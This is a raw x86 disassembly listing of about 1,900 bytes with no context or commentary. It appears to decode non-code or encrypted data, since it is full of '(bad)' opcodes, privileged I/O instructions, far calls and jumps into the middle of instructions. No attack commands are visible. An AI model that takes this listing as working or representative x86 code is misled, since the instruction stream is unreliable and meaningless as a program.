  40fb36:	fbstp  TBYTE PTR [eax+0x5ff1cfbe]
  40fb3c:	dec    edx
  40fb3d:	jno    0x40fb7a
  40fb3f:	out    dx,al
  40fb40:	mov    ds:0x947e2962,al
  40fb45:	je     0x40fb04
  40fb47:	sub    ah,bl
  40fb49:	rcr    BYTE PTR ds:0x77a98ee7,cl
  40fb4f:	xchg   ebx,eax
  40fb50:	and    BYTE PTR [esi+0x76],0xb1
  40fb54:	fdiv   DWORD PTR [ecx+0x3c]
  40fb57:	cmp    eax,0x596c0f9d
  40fb5c:	cmc    
  40fb5d:	or     DWORD PTR [edx+0x11],edx
  40fb60:	ret    0x94e4
  40fb63:	dec    esi
  40fb64:	cmc    
  40fb65:	jle    0x40fb9a
  40fb67:	ins    BYTE PTR es:[edi],dx
  40fb68:	icebp  
  40fb69:	inc    edi
  40fb6a:	xor    eax,0xe7fecc8c
  40fb6f:	mov    edx,ebp
  40fb71:	fstp   QWORD PTR [ebx-0x1b]
  40fb74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb75:	dec    ebp
  40fb76:	sbb    eax,0x78be6b6b
  40fb7b:	leave  
  40fb7c:	sbb    al,0xc3
  40fb7e:	int    0x75
  40fb80:	daa    
  40fb81:	mov    eax,0xf2d8d946
  40fb86:	ss inc eax
  40fb88:	popa   
  40fb89:	pusha  
  40fb8a:	xchg   dh,bh
  40fb8c:	shr    DWORD PTR [edx],1
  40fb8e:	xchg   DWORD PTR [ebx-0x61],esi
  40fb91:	mov    cl,0xc3
  40fb93:	lea    esi,[edi]
  40fb95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb96:	jnp    0x40fbf9
  40fb98:	sbb    DWORD PTR [eax+esi*4-0x78],esp
  40fb9c:	and    eax,0xf337dccb
  40fba1:	mov    bh,0xd
  40fba3:	sub    DWORD PTR [edi+0x3f715683],ecx
  40fba9:	and    eax,0xc2030b03
  40fbae:	xchg   ebp,eax
  40fbaf:	in     eax,0xae
  40fbb1:	test   BYTE PTR [edx+0x69f0a8a5],ah
  40fbb7:	push   edi
  40fbb8:	xor    DWORD PTR [ebx+0x7fa714c8],eax
  40fbbe:	mov    ds,ecx
  40fbc0:	lock add DWORD PTR [ebx+0x1c],edi
  40fbc4:	cmc    
  40fbc5:	pop    ebx
  40fbc6:	imul   ecx,DWORD PTR [edi],0xa
  40fbc9:	pop    ebp
  40fbca:	aaa    
  40fbcb:	mov    fs,WORD PTR [eax]
  40fbcd:	sbb    al,0x80
  40fbcf:	push   edi
  40fbd0:	mov    ah,0x57
  40fbd2:	dec    cl
  40fbd4:	and    al,0xd0
  40fbd6:	aam    0xb6
  40fbd8:	cs jne 0x40fc1e
  40fbdb:	(bad)  
  40fbdc:	and    dh,BYTE PTR [ebp+ebx*2-0x210f72d9]
  40fbe3:	div    al
  40fbe5:	into   
  40fbe6:	push   esi
  40fbe7:	adc    BYTE PTR [esi+0x57],al
  40fbea:	jno    0x40fbb6
  40fbec:	cmp    ebx,ebx
  40fbee:	aaa    
  40fbef:	test   eax,0x4adce386
  40fbf4:	sbb    eax,DWORD PTR [edx-0x749f7270]
  40fbfa:	add    BYTE PTR [ecx-0x5cf7f665],0xba
  40fc01:	out    dx,al
  40fc02:	push   ebp
  40fc03:	scas   eax,DWORD PTR es:[edi]
  40fc04:	int    0x9
  40fc06:	in     eax,0x5a
  40fc08:	scas   al,BYTE PTR es:[edi]
  40fc09:	cwde   
  40fc0a:	cmp    DWORD PTR [esi-0x1b],edi
  40fc0d:	loop   0x40fc06
  40fc0f:	aas    
  40fc10:	jle    0x40fbeb
  40fc12:	sub    al,0xee
  40fc14:	in     al,0xc1
  40fc16:	sbb    eax,eax
  40fc18:	add    ebp,DWORD PTR [esi]
  40fc1a:	pusha  
  40fc1b:	inc    ecx
  40fc1c:	sbb    ebx,ecx
  40fc1e:	inc    ebx
  40fc1f:	mov    ecx,eax
  40fc21:	ret    0xfb7a
  40fc24:	inc    esp
  40fc25:	(bad)  
  40fc26:	mov    ebx,0x8f1d8fb
  40fc2b:	jns    0x40fc8d
  40fc2d:	mov    eax,ds:0xdcb771bb
  40fc32:	sbb    BYTE PTR [edi+edi*1],ah
  40fc35:	cli    
  40fc36:	adc    ah,dh
  40fc38:	icebp  
  40fc39:	mov    al,0x31
  40fc3b:	mov    dh,0xbf
  40fc3d:	lock sti 
  40fc3f:	not    DWORD PTR [edx]
  40fc41:	add    dl,BYTE PTR ds:0x603bdf36
  40fc47:	ins    BYTE PTR es:[edi],dx
  40fc48:	ss fsub st,st(4)
  40fc4b:	rcr    dl,cl
  40fc4d:	fs push 0x61
  40fc50:	dec    ebp
  40fc51:	iret   
  40fc52:	int    0x6d
  40fc54:	int3   
  40fc55:	xor    eax,0x6959a915
  40fc5a:	and    dh,ch
  40fc5c:	lds    edi,FWORD PTR [ebp+eax*4-0x4aae3a2b]
  40fc63:	stos   BYTE PTR es:[edi],al
  40fc64:	jae    0x40fc06
  40fc66:	inc    edx
  40fc67:	loop   0x40fc0c
  40fc69:	mov    gs,WORD PTR [esi]
  40fc6b:	je     0x40fc57
  40fc6d:	push   ss
  40fc6e:	and    DWORD PTR [ebp+0x3c],esi
  40fc71:	pop    esi
  40fc72:	mov    ds:0x17bcbfff,eax
  40fc77:	rol    BYTE PTR [eax-0x3030e6db],0xf4
  40fc7e:	pop    ebp
  40fc7f:	(bad)  
  40fc80:	jmp    0x2540b845
  40fc85:	fistp  QWORD PTR [ebp+0x249bfc49]
  40fc8b:	push   esi
  40fc8c:	xlat   BYTE PTR ds:[ebx]
  40fc8d:	mov    cl,0x23
  40fc8f:	lea    edi,[esi]
  40fc91:	call   0xee47:0x563909f1
  40fc98:	and    ecx,DWORD PTR ds:0x4a827c21
  40fc9e:	out    0xd1,al
  40fca0:	xchg   ecx,eax
  40fca1:	xor    ah,BYTE PTR [bx+0x4a9c]
  40fca6:	push   edi
  40fca7:	popf   
  40fca8:	lahf   
  40fca9:	inc    edi
  40fcaa:	push   0x81c125e5
  40fcaf:	push   ebp
  40fcb0:	push   0xffffffe1
  40fcb2:	das    
  40fcb3:	inc    ecx
  40fcb4:	shl    DWORD PTR [eax+0x3195424f],0x74
  40fcbb:	int3   
  40fcbc:	inc    ebx
  40fcbd:	test   esi,0xa379c3c9
  40fcc3:	adc    eax,0x8949549e
  40fcc8:	les    ebp,FWORD PTR [esi+0x1c0b4f8a]
  40fcce:	pop    eax
  40fccf:	or     eax,DWORD PTR [edi+0x36]
  40fcd2:	push   eax
  40fcd3:	call   0x185c:0xdaac4ccc
  40fcda:	clc    
  40fcdb:	mov    eax,DWORD PTR [eax+0x3f]
  40fcde:	xchg   DWORD PTR [ecx+0x243ab980],edi
  40fce4:	mov    ah,0x6d
  40fce6:	js     0x40fcee
  40fce8:	fiadd  WORD PTR [esp+ecx*1+0x43]
  40fcec:	jl     0x40fd57
  40fcee:	jle    0x40fd34
  40fcf0:	iret   
  40fcf1:	(bad)  
  40fcf3:	add    al,0x9e
  40fcf5:	or     eax,0xdd70ee7e
  40fcfa:	xchg   ebx,eax
  40fcfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcfc:	push   0x945fe204
  40fd01:	and    al,0x69
  40fd03:	dec    eax
  40fd04:	leave  
  40fd05:	mov    ebp,0xf2a36f35
  40fd0a:	mov    esp,0x2aed9e65
  40fd0f:	push   0x13a22c60
  40fd14:	jb     0x40fd6e
  40fd16:	inc    ebp
  40fd17:	push   eax
  40fd18:	jle    0x40fccf
  40fd1a:	or     eax,eax
  40fd1c:	adc    eax,0x39928331
  40fd21:	call   0xea31465e
  40fd26:	test   eax,0x66b24e5c
  40fd2b:	sub    DWORD PTR [esi-0x33a3e5f8],edx
  40fd31:	int    0x9
  40fd33:	in     al,dx
  40fd34:	cld    
  40fd35:	dec    esp
  40fd36:	sbb    eax,0x761774cf
  40fd3b:	std    
  40fd3c:	cdq    
  40fd3d:	jge    0x40fdb6
  40fd3f:	jge    0x40fd75
  40fd41:	into   
  40fd42:	cwde   
  40fd43:	inc    edi
  40fd44:	in     al,dx
  40fd45:	fcom   DWORD PTR [eax-0x5395abdd]
  40fd4b:	sub    esi,edi
  40fd4d:	inc    ecx
  40fd4e:	iret   
  40fd4f:	jne    0x40fcde
  40fd51:	scas   eax,DWORD PTR es:[edi]
  40fd52:	push   edx
  40fd53:	test   BYTE PTR [ebp-0x23],dh
  40fd56:	sub    esi,esp
  40fd58:	lahf   
  40fd59:	imul   ecx,esp,0xbf702257
  40fd5f:	push   esi
  40fd60:	and    BYTE PTR [eax+0x51],ah
  40fd63:	mov    esp,0x6aebdd1a
  40fd68:	xchg   edx,eax
  40fd69:	gs inc ebx
  40fd6b:	push   ebx
  40fd6c:	cmp    dl,BYTE PTR [eax+ebp*4+0x663e5492]
  40fd73:	and    eax,0x3a58138a
  40fd78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd79:	loop   0x40fd3d
  40fd7b:	mov    cl,0x75
  40fd7d:	inc    ebx
  40fd7e:	jno    0x40fd1d
  40fd80:	test   DWORD PTR [ebx+0x76],esi
  40fd83:	xchg   esp,eax
  40fd84:	in     al,dx
  40fd85:	jg     0x40fd0b
  40fd87:	lods   eax,DWORD PTR ds:[esi]
  40fd88:	jae    0x40fd5e
  40fd8a:	and    al,0x5d
  40fd8c:	jmp    0xc5a9a958
  40fd91:	(bad)  
  40fd92:	jmp    0x40fda8
  40fd94:	fld    QWORD PTR [edi+ecx*8]
  40fd97:	cmp    DWORD PTR ds:0xb2ba503d,ebp
  40fd9d:	in     eax,dx
  40fd9e:	aaa    
  40fd9f:	div    BYTE PTR [edi]
  40fda1:	mov    bh,0x63
  40fda3:	push   esi
  40fda4:	or     DWORD PTR [edi-0x1d3060fc],esi
  40fdaa:	in     al,dx
  40fdab:	ss int3 
  40fdad:	(bad)  
  40fdae:	mov    eax,ds:0x8d7efe5c
  40fdb3:	inc    ebx
  40fdb4:	add    al,0x63
  40fdb6:	outs   dx,DWORD PTR ds:[esi]
  40fdb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdb8:	jb     0x40fe08
  40fdba:	mov    BYTE PTR [esi],ch
  40fdbc:	stos   BYTE PTR es:[edi],al
  40fdbd:	or     al,0x88
  40fdbf:	mov    ch,0x86
  40fdc1:	imul   edx,DWORD PTR [ebx-0x7ca5d89],0xf445a347
  40fdcb:	dec    edx
  40fdcc:	cwde   
  40fdcd:	loop   0x40fd7b
  40fdcf:	mov    ebp,0x470f309f
  40fdd4:	stc    
  40fdd5:	std    
  40fdd6:	imul   ebp,DWORD PTR [eax-0x26],0xffffff9d
  40fdda:	pop    ebx
  40fddb:	int    0x28
  40fddd:	dec    ebx
  40fdde:	loopne 0x40fde5
  40fde0:	pop    edx
  40fde1:	adc    DWORD PTR [eax+0x265018d5],edi
  40fde7:	cmp    eax,0xd8cbf9a7
  40fdec:	and    BYTE PTR [edi-0x35],0xd0
  40fdf0:	shl    DWORD PTR [edx-0x289f4468],0xb3
  40fdf7:	xchg   edi,eax
  40fdf8:	adc    eax,0xd07d2220
  40fdfd:	or     eax,0x2f46b904
  40fe02:	dec    eax
  40fe03:	jp     0x40fe6d
  40fe05:	(bad)  
  40fe06:	adc    DWORD PTR [eax*1+0x7c7d332a],ecx
  40fe0d:	mov    bl,BYTE PTR [ecx]
  40fe0f:	iret   
  40fe10:	adc    DWORD PTR [esi-0xc],ebp
  40fe13:	ins    BYTE PTR es:[edi],dx
  40fe14:	(bad)  
  40fe15:	inc    edi
  40fe16:	repnz cmc 
  40fe18:	fld    DWORD PTR ss:[ebx+edi*4]
  40fe1c:	adc    ebx,DWORD PTR [edx]
  40fe1e:	xor    edx,DWORD PTR [edx]
  40fe20:	fnstsw WORD PTR [edi+0x57]
  40fe23:	adc    DWORD PTR [ecx+0x4f],edi
  40fe26:	push   ebx
  40fe27:	scas   al,BYTE PTR es:[edi]
  40fe28:	push   esi
  40fe29:	jns    0x40fe32
  40fe2b:	push   esp
  40fe2c:	or     DWORD PTR [ebp-0x237f6b05],0xe38e365f
  40fe36:	jns    0x40fe32
  40fe38:	sbb    ch,BYTE PTR [edx+0x23]
  40fe3b:	adc    cl,bl
  40fe3d:	addr16 repnz (bad) 
  40fe40:	pop    esi
  40fe41:	lahf   
  40fe42:	out    dx,eax
  40fe43:	jg     0x40fe72
  40fe45:	and    eax,DWORD PTR [esi+0x13]
  40fe48:	rcr    cl,1
  40fe4a:	mov    ds:0x65d829bb,al
  40fe4f:	xor    DWORD PTR [ebx-0x2c],esp
  40fe52:	sub    bl,BYTE PTR [edx+edx*8-0x4d]
  40fe56:	mov    edi,0xa9a872f5
  40fe5b:	rol    ebp,0x70
  40fe5e:	mov    edx,0x8fb134c8
  40fe63:	and    al,0x6d
  40fe65:	sub    BYTE PTR ds:0xddd45d8e,0x50
  40fe6c:	dec    edi
  40fe6d:	fxch   st(3)
  40fe6f:	xchg   esp,eax
  40fe70:	cmc    
  40fe71:	test   eax,0xf76b9321
  40fe76:	add    edi,edi
  40fe78:	call   0xce33:0x9ab6ccce
  40fe7f:	add    DWORD PTR ds:0xc95323d7,ebx
  40fe85:	xlat   BYTE PTR ds:[ebx]
  40fe86:	cmp    edi,esp
  40fe88:	or     al,0xff
  40fe8a:	mov    dh,0x3d
  40fe8c:	add    eax,0x15fc6485
  40fe91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe92:	test   DWORD PTR [ecx-0x2b],edx
  40fe95:	popf   
  40fe96:	gs (bad) 
  40fe98:	xlat   BYTE PTR ds:[ebx]
  40fe99:	out    dx,eax
  40fe9a:	jnp    0x40fed1
  40fe9c:	adc    BYTE PTR [edx-0x6b33aec0],cl
  40fea2:	fmul   QWORD PTR [ebp+0x55]
  40fea5:	not    BYTE PTR [edi]
  40fea7:	dec    esi
  40fea8:	test   ecx,ecx
  40feaa:	pop    ecx
  40feab:	lods   al,BYTE PTR ds:[esi]
  40feac:	push   eax
  40fead:	jbe    0x40fecd
  40feaf:	pop    ss
  40feb0:	inc    esi
  40feb1:	and    eax,0x82f94281
  40feb6:	sbb    bl,BYTE PTR [esp+eax*4-0x2f]
  40feba:	cmp    ecx,DWORD PTR [ecx+ebp*2-0x4a]
  40febe:	jg     0x40ff38
  40fec0:	push   ecx
  40fec1:	jb     0x40fe4f
  40fec3:	test   BYTE PTR [eax],al
  40fec5:	sbb    bl,al
  40fec7:	inc    edi
  40fec8:	xchg   esp,eax
  40fec9:	mov    DWORD PTR [esi-0x4c],esp
  40fecc:	in     al,dx
  40fecd:	jp     0x40fee3
  40fecf:	loopne 0x40ff29
  40fed1:	jae    0x40ff37
  40fed3:	dec    edx
  40fed4:	xor    DWORD PTR [edi],ebx
  40fed6:	mov    eax,ds:0xb6c2879d
  40fedb:	(bad)  
  40fedd:	(bad)  
  40fede:	xchg   ecx,eax
  40fedf:	cwde   
  40fee0:	cli    
  40fee1:	xor    dh,BYTE PTR [eax+eax*1+0x2d55866d]
  40fee8:	mov    eax,0x33cf4eda
  40feed:	mov    dl,0x59
  40feef:	pop    esp
  40fef0:	sub    esi,DWORD PTR [ecx-0x6fe0c6e9]
  40fef6:	lock pop eax
  40fef8:	xor    dh,BYTE PTR ss:[eax*4-0xc0369d4]
  40ff00:	je     0x40fed1
  40ff02:	test   BYTE PTR [ebx+0x69ee2bec],ah
  40ff08:	leave  
  40ff09:	and    DWORD PTR [ebx+edi*8-0x350621b2],edx
  40ff10:	pushf  
  40ff11:	cmp    al,ah
  40ff13:	mov    WORD PTR [esp+ebp*4+0x1606c9e3],fs
  40ff1a:	ficom  DWORD PTR [eax-0x1d9a683e]
  40ff20:	test   al,0xe7
  40ff22:	in     eax,0x68
  40ff24:	push   ebx
  40ff25:	sub    eax,ebp
  40ff27:	sub    DWORD PTR [ecx-0x2],ebp
  40ff2a:	cmp    DWORD PTR [eax+0x34],ebp
  40ff2d:	in     eax,dx
  40ff2e:	and    BYTE PTR [esi-0x66c65464],0xde
  40ff35:	xchg   ebx,eax
  40ff36:	clc    
  40ff37:	scas   al,BYTE PTR es:[edi]
  40ff38:	mov    WORD PTR [edx],?
  40ff3a:	xor    eax,0x66e7fb07
  40ff3f:	sbb    DWORD PTR [eax+0x77],0x1
  40ff43:	cli    
  40ff44:	retf   
  40ff45:	dec    esp
  40ff46:	test   DWORD PTR [ebx-0x40],ebp
  40ff49:	sbb    cl,BYTE PTR [eax+0x1d]
  40ff4c:	pop    esi
  40ff4d:	push   eax
  40ff4e:	sub    ah,bl
  40ff50:	push   ss
  40ff51:	sbb    al,0x58
  40ff53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff54:	and    bl,0xfa
  40ff57:	inc    esi
  40ff58:	add    eax,0xcb7c04c6
  40ff5d:	push   es
  40ff5e:	jge    0x40ff98
  40ff60:	inc    DWORD PTR [esi+ebx*2-0xd]
  40ff64:	(bad)  
  40ff65:	clc    
  40ff66:	js     0x40ff6a
  40ff68:	xchg   esp,eax
  40ff69:	jecxz  0x40ffd4
  40ff6b:	js     0x40ff4e
  40ff6d:	xchg   edx,eax
  40ff6e:	hlt    
  40ff6f:	in     al,0xf6
  40ff71:	pop    ss
  40ff72:	xor    al,0x26
  40ff74:	pop    esp
  40ff75:	fwait
  40ff76:	nop
  40ff77:	cvtps2pd xmm2,QWORD PTR [eax+0x7bb2ae56]
  40ff7e:	add    DWORD PTR [edx-0x471dd178],esp
  40ff84:	arpl   sp,dx
  40ff86:	stos   DWORD PTR es:[edi],eax
  40ff87:	mov    edi,0x7f91e095
  40ff8c:	lods   eax,DWORD PTR ds:[esi]
  40ff8d:	push   edx
  40ff8e:	enter  0x581,0xbd
  40ff92:	pop    esp
  40ff93:	bound  esp,QWORD PTR [edi]
  40ff95:	inc    ebx
  40ff96:	push   es
  40ff97:	imul   esp,edx,0x4f7a4381
  40ff9d:	shl    al,0xe8
  40ffa0:	fs push esp
  40ffa2:	retf   0xe3bd
  40ffa5:	xchg   BYTE PTR ds:0x52a66be7,ah
  40ffab:	pop    ebx
  40ffac:	cmp    edi,DWORD PTR [edi+0x66667984]
  40ffb2:	dec    esi
  40ffb3:	sub    DWORD PTR ds:0xaec8456f,edx
  40ffb9:	or     al,0x68
  40ffbb:	push   ds
  40ffbc:	jecxz  0x41002f
  40ffbe:	push   ecx
  40ffbf:	lahf   
  40ffc0:	jle    0x40ff8f
  40ffc2:	jmp    0x40ff5e
  40ffc4:	and    DWORD PTR [ebx+0x1],ebp
  40ffc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffc8:	or     DWORD PTR [ebx+ebp*1],0x2a34708c
  40ffcf:	je     0x40ff74
  40ffd1:	inc    esp
  40ffd2:	push   0xffffff9c
  40ffd4:	sbb    dh,BYTE PTR [esp+eax*8+0x79be172d]
  40ffdb:	xchg   ecx,eax
  40ffdc:	xchg   BYTE PTR ds:0x37678b51,bl
  40ffe2:	mov    bh,0xa0
  40ffe4:	push   ss
  40ffe5:	sbb    BYTE PTR [ecx-0xa],dh
  40ffe8:	mov    bh,0x60
  40ffea:	xchg   esi,eax
  40ffeb:	rcl    BYTE PTR [eax],1
  40ffed:	pop    DWORD PTR [eax+0x17]
  40fff0:	cld    
  40fff1:	jg     0x40ff8d
  40fff3:	sub    DWORD PTR [ebx+0x29],0x49
  40fff7:	rcr    BYTE PTR [edi+0x4f],0xaa
  40fffb:	fidiv  WORD PTR [ebx-0x4765340]
  410001:	cmp    ah,ch
  410003:	(bad)  
  410004:	push   ebx
  410005:	mov    bh,0x63
  410007:	sbb    dh,BYTE PTR [ebx]
  410009:	bts    WORD PTR [edi+0x35da0f2f],bp
  410011:	xchg   DWORD PTR [ebx],ecx
  410013:	mov    ch,0xbd
  410015:	popa   
  410016:	cwde   
  410017:	and    cl,BYTE PTR [ebx]
  410019:	fld    TBYTE PTR [edx+0x3c]
  41001c:	cmp    BYTE PTR [ebp+0x12],al
  41001f:	mov    dh,0xd3
  410021:	in     eax,0xcf
  410023:	dec    esp
  410024:	mov    bh,0x46
  410026:	loop   0x410074
  410028:	repz stc 
  41002a:	cdq    
  41002b:	xchg   DWORD PTR [edi],edx
  41002d:	fwait
  41002e:	aam    0x2b
  410030:	leave  
  410031:	leave  
  410032:	retf   
  410033:	xor    DWORD PTR [ecx-0x693c4510],ecx
  410039:	lea    esp,[ebp+0x615d7eaa]
  41003f:	pop    ebp
  410040:	xchg   ebp,eax
  410041:	popf   
  410042:	stos   BYTE PTR es:[edi],al
  410043:	clc    
  410044:	pop    esi
  410045:	mov    eax,0x835b7017
  41004a:	inc    edx
  41004b:	adc    bl,BYTE PTR [esi+eax*4]
  41004e:	push   ss
  41004f:	jp     0x410045
  410051:	daa    
  410052:	dec    ebx
  410053:	ds adc al,0xcb
  410056:	mov    eax,?
  410058:	int3   
  410059:	retf   
  41005a:	jns    0x4100b9
  41005c:	xor    BYTE PTR [ebx+0x574f80d],bl
  410062:	(bad)  
  410063:	int    0xf1
  410065:	popa   
  410066:	jno    0x41000b
  410068:	lods   al,BYTE PTR ds:[esi]
  410069:	cmp    DWORD PTR [ecx-0x6117a4bf],0x1fe044b8
  410073:	out    dx,eax
  410074:	inc    ebx
  410075:	mov    eax,edx
  410077:	push   cs
  410078:	loop   0x41006a
  41007a:	adc    BYTE PTR [edi+0x60],cl
  41007d:	enter  0x6773,0xe5
  410081:	push   ss
  410082:	mov    edi,0xe8f285ac
  410087:	push   0xffffffc1
  410089:	movnti DWORD PTR [esi+0x1c],ebx
  41008d:	iret   
  41008e:	or     esp,DWORD PTR [ebx+0x5c]
  410091:	xchg   edi,eax
  410092:	push   ecx
  410093:	int3   
  410094:	jno    0x41009f
  410096:	fisub  WORD PTR [esi]
  410098:	cwde   
  410099:	imul   ebp,DWORD PTR ds:0xedef809f,0x8be66863
  4100a3:	fdivr  QWORD PTR [ecx]
  4100a5:	daa    
  4100a6:	in     al,dx
  4100a7:	add    BYTE PTR [ebx+0x72b58eea],dl
  4100ad:	stos   BYTE PTR es:[edi],al
  4100ae:	xor    esp,DWORD PTR [ecx]
  4100b0:	push   eax
  4100b1:	inc    esp
  4100b2:	sub    esi,edx
  4100b4:	aaa    
  4100b5:	add    eax,0x9ae0fe14
  4100ba:	xlat   BYTE PTR ds:[ebx]
  4100bb:	push   cs
  4100bc:	rcl    DWORD PTR [ebx],cl
  4100be:	push   eax
  4100bf:	inc    esp
  4100c0:	adc    al,BYTE PTR [ebp+0x62265504]
  4100c6:	in     eax,dx
  4100c7:	es push 0xfffffff1
  4100ca:	out    dx,al
  4100cb:	jb     0x410085
  4100cd:	mov    ds:0xc7e24d0c,al
  4100d2:	leave  
  4100d3:	xor    ah,bl
  4100d5:	pop    edi
  4100d6:	xor    ah,BYTE PTR [edx-0x28]
  4100d9:	int    0xb7
  4100db:	xchg   ebx,eax
  4100dc:	pop    ebp
  4100dd:	int    0x73
  4100df:	sbb    BYTE PTR [ebx],dl
  4100e1:	or     esp,esi
  4100e3:	add    BYTE PTR [esi-0x6d28c16b],dl
  4100e9:	ins    BYTE PTR es:[edi],dx
  4100ea:	ins    BYTE PTR es:[edi],dx
  4100eb:	mov    gs,WORD PTR [ebx-0x30]
  4100ee:	pop    edx
  4100ef:	jmp    0x2c16d08c
  4100f4:	xor    ah,al
  4100f6:	and    ch,bl
  4100f8:	adc    BYTE PTR [eax],0x3e
  4100fb:	(bad)  [edx+0x25]
  4100fe:	sbb    bh,BYTE PTR [ebp+0x1e]
  410101:	cld    
  410102:	push   eax
  410103:	xor    BYTE PTR [esi+0x13],dh
  410106:	pop    eax
  410107:	sub    al,BYTE PTR [edi+0xb]
  41010a:	(bad)  
  41010b:	cwde   
  41010c:	add    dl,BYTE PTR [eax+0x35654c5d]
  410112:	dec    esi
  410113:	sub    DWORD PTR [edi+0x32e00500],edx
  410119:	sbb    bh,BYTE PTR [ecx+0x1339b4aa]
  41011f:	stc    
  410120:	inc    ebp
  410121:	xchg   ebp,eax
  410122:	mov    al,0x18
  410124:	clc    
  410125:	arpl   WORD PTR [ebp+0x35cc090d],ax
  41012b:	dec    ebp
  41012c:	jmp    FWORD PTR [edx]
  41012e:	scas   al,BYTE PTR es:[edi]
  41012f:	mov    cl,0x7
  410131:	outs   dx,DWORD PTR ds:[esi]
  410132:	push   DWORD PTR ds:[edi]
  410135:	loop   0x4101b1
  410137:	mov    esp,0x5bd4b195
  41013c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41013d:	test   al,0xe9
  41013f:	sub    al,0xdc
  410141:	pusha  
  410142:	das    
  410143:	enter  0x1e7b,0x69
  410147:	xor    eax,0x76bf9790
  41014c:	aaa    
  41014d:	jl     0x410169
  41014f:	or     eax,0x1f3893e7
  410154:	xor    al,0xfd
  410156:	jno    0x4101a2
  410158:	std    
  410159:	dec    edi
  41015a:	jne    0x4100dc
  41015c:	jo     0x4100ff
  41015e:	test   eax,0xe3fabfc
  410163:	adc    esp,DWORD PTR [esi-0x3d3d5d78]
  410169:	ds popa 
  41016b:	out    0xd3,al
  41016d:	idiv   DWORD PTR [edi]
  41016f:	das    
  410170:	sbb    DWORD PTR [edx+0x66b6c206],ebp
  410176:	mov    bl,0xd5
  410178:	mov    ch,BYTE PTR [edi+0x1f]
  41017b:	push   edx
  41017c:	add    al,BYTE PTR [esp+edi*4]
  41017f:	ja     0x41019e
  410181:	mov    bh,0xdb
  410183:	stc    
  410184:	lock ret 
  410186:	stos   DWORD PTR es:[edi],eax
  410187:	jb     0x410130
  410189:	aaa    
  41018a:	outs   dx,DWORD PTR ds:[esi]
  41018b:	jnp    0x4101fc
  41018d:	cld    
  41018e:	add    al,0x25
  410190:	dec    eax
  410191:	jp     0x4101b1
  410193:	cmp    eax,0x13779094
  410198:	imul   ebp,ebx,0xa493e4ba
  41019e:	cmp    dl,BYTE PTR [eax+0x74bb20b4]
  4101a4:	mov    ds:0xbedf4bcd,al
  4101a9:	mov    dh,BYTE PTR [ebx-0x10209ffc]
  4101af:	jge    0x4101a5
  4101b1:	fsubr  DWORD PTR [ebx+0x79]
  4101b4:	ja     0x4101ed
  4101b6:	in     eax,dx
  4101b7:	shl    edi,1
  4101b9:	or     al,0x19
  4101bb:	add    ch,BYTE PTR [esi]
  4101bd:	jp     0x41015d
  4101bf:	adc    eax,DWORD PTR gs:0xc6a35fc2
  4101c6:	push   ebp
  4101c7:	xlat   BYTE PTR ds:[ebx]
  4101c8:	gs repz xchg esi,eax
  4101cb:	xor    eax,0x31d59304
  4101d0:	sbb    ebp,esi
  4101d2:	sbb    al,0x63
  4101d4:	inc    edi
  4101d5:	xlat   BYTE PTR ds:[ebx]
  4101d6:	mov    eax,ds:0x829d43f9
  4101db:	cmp    ebp,ebx
  4101dd:	dec    esp
  4101de:	aas    
  4101df:	lock sbb al,0x1f
  4101e2:	sbb    DWORD PTR [ebx+ecx*8],ebx
  4101e5:	xor    bh,BYTE PTR [ecx-0x6420b264]
  4101eb:	aas    
  4101ec:	sar    ebp,cl
  4101ee:	callw  0x5367
  4101f2:	div    BYTE PTR [esi]
  4101f4:	mov    ebp,0x79a85df7
  4101f9:	int    0x6a
  4101fb:	popf   
  4101fc:	sub    DWORD PTR [ebp-0x5],esp
  4101ff:	mov    edx,0xfe19f9f5
  410204:	icebp  
  410205:	clc    
  410206:	dec    esi
  410207:	xor    BYTE PTR [esi-0x4d],dl
  41020a:	mov    BYTE PTR fs:[ebx+ebx*1-0x3f],dh
  41020f:	ins    BYTE PTR es:[edi],dx
  410210:	sbb    cl,BYTE PTR [eax+0x13]
  410213:	push   eax
  410214:	(bad)  
  410215:	push   ebp
  410216:	shr    BYTE PTR [ebx+0x15],0xf3
  41021a:	test   DWORD PTR [esi+0x69387ba9],0x6ce49f3
  410224:	mov    al,BYTE PTR [ebp-0x246bf355]
  41022a:	push   ebx
  41022b:	inc    ecx
  41022c:	dec    edx
  41022d:	xchg   ebx,eax
  41022e:	les    edx,FWORD PTR [esi]
  410230:	aas    
  410231:	mov    BYTE PTR [esi],al
  410233:	fld    TBYTE PTR [eax-0x13]
  410236:	pop    eax
  410237:	sub    edx,DWORD PTR [ecx+0x54f33285]
  41023d:	and    ch,BYTE PTR [esi-0x67f669c3]
  410243:	stos   DWORD PTR es:[edi],eax
  410244:	ins    DWORD PTR es:[edi],dx
  410245:	sub    ecx,ebx
  410247:	fs dec ebx
  410249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41024a:	mov    ch,0x9e
  41024c:	ret    0x23aa
  41024f:	imul   ebx,DWORD PTR [ebx+0x4a3242cc],0x3a
  410256:	bound  ecx,QWORD PTR [esi+esi*1+0x3c]
  41025a:	add    DWORD PTR [ecx],ecx
  41025c:	aad    0x83
  41025e:	dec    ebx
  41025f:	retf   
  410260:	sti    
  410261:	jne    0x410238
  410263:	adc    al,0x2d
  410265:	pop    ebx
  410266:	add    edi,DWORD PTR [edx]
  410268:	in     eax,0x6a
  41026a:	or     DWORD PTR [ebp+0x32],eax
  41026d:	ins    BYTE PTR es:[edi],dx
  41026e:	jo     0x410285
  410270:	aam    0xdc
  410272:	ret    0x8b5c
  410275:	adc    al,0xef
  410277:	xchg   esi,eax
  410278:	dec    ebp
  410279:	pop    ecx
  41027a:	and    ecx,ebp
  41027c:	sti    
  41027d:	jae    0x4102dc
  41027f:	repnz cli 
  410281:	icebp  
  410282:	xor    esp,DWORD PTR [ebx]
  410284:	mov    ecx,0xcc3472c8
  410289:	mov    bl,0x35
  41028b:	enter  0x77cd,0xff
  41028f:	mov    ah,0xf6
  410291:	clc    
  410292:	repnz sar edx,cl
  410295:	mov    ecx,0xf4fb2062
  41029a:	pop    es
  41029b:	popf   
